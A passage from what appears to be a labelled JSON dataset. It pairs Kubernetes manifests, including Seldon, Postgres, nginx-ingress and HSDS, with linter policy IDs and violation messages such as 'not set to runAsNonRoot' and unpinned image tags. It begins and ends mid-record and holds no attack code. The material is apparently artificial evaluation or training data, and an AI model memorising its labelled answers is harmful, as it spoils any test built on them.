    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"seldon-manager\" not found"
  },
  {
    "id": "2201",
    "manifest_path": "data/manifests/the_stack_sample/sample_0536.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "2202",
    "manifest_path": "data/manifests/the_stack_sample/sample_0537.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: oscar\n  namespace: oscar\nspec:\n  ports:\n  - name: endpoint\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: oscar\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:oscar])"
  },
  {
    "id": "2203",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "2204",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "2205",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "2206",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "2207",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress\" does not have a read-only root file system"
  },
  {
    "id": "2208",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"nginx-ingress\" not found"
  },
  {
    "id": "2209",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress\" is not set to runAsNonRoot"
  },
  {
    "id": "2210",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress\" has cpu request 0"
  },
  {
    "id": "2211",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress\" has memory limit 0"
  },
  {
    "id": "2212",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2213",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2214",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2215",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2216",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2217",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dn\" is using an invalid container image, \"hdfgroup/hsds\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2218",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sn\" is using an invalid container image, \"hdfgroup/hsds\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2219",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        